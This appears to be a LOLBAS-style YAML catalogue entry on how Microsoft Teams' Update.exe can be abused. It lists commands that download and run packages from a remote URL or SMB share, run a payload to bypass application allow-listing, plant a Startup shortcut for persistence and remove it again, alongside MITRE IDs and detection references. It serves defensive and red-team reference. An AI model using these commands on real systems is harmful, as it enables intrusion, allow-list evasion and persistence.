---
Name: Update.exe
Description: Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
Author: 'Oddvar Moe'
Created: 2019-06-26
Commands:
  - Command: Update.exe --download [url to package]
    Description: The above binary will go to url and look for RELEASES file and download the nuget package.
    Usecase: Download binary
    Category: Download
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --update=[url to package]
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
    Usecase: Download and execute binary
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --update=[url to package]
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
    Usecase: Download and execute binary
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --update=\\remoteserver\payloadFolder
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
    Usecase: Download and execute binary
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --update=\\remoteserver\payloadFolder
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
    Usecase: Download and execute binary
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --updateRollback=[url to package]
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
    Usecase: Download and execute binary
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --updateRollback=[url to package]
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
    Usecase: Download and execute binary
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --processStart payload.exe --process-start-args "whatever args"
    Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
    Usecase: Application Whitelisting Bypass
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --updateRollback=\\remoteserver\payloadFolder
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
    Usecase: Download and execute binary
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --updateRollback=\\remoteserver\payloadFolder
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
    Usecase: Download and execute binary
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --processStart payload.exe --process-start-args "whatever args"
    Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
    Usecase: Execute binary
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --createShortcut=payload.exe -l=Startup
    Description: Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a payload.exe shortcut in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.
    Usecase: Execute binary
    Category: Execute
    Privileges: User
    MitreID: T1547
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: Update.exe --removeShortcut=payload.exe -l=Startup
    Description: Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.
    Usecase: Execute binary
    Category: Execute
    Privileges: User
    MitreID: T1070
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
Full_Path:
  - Path: '%localappdata%\Microsoft\Teams\update.exe'
Code_Sample:
  - Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml
  - IOC: Update.exe spawned an unknown process
Resources:
  - Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
  - Link: https://twitter.com/reegun21/status/1144182772623269889
  - Link: https://twitter.com/MrUn1k0d3r/status/1143928885211537408
  - Link: https://twitter.com/reegun21/status/1291005287034281990
  - Link: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
  - Link: https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
  - Link: https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
  - Link: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/
Acknowledgement:
  - Person: Reegun Richard Jayapaul (SpiderLabs, Trustwave)
    Handle: '@reegun21'
  - Person: Mr.Un1k0d3r
    Handle: '@MrUn1k0d3r'
  - Person: Adam
    Handle: '@Hexacorn'
  - Person: Jesus Galvez
---
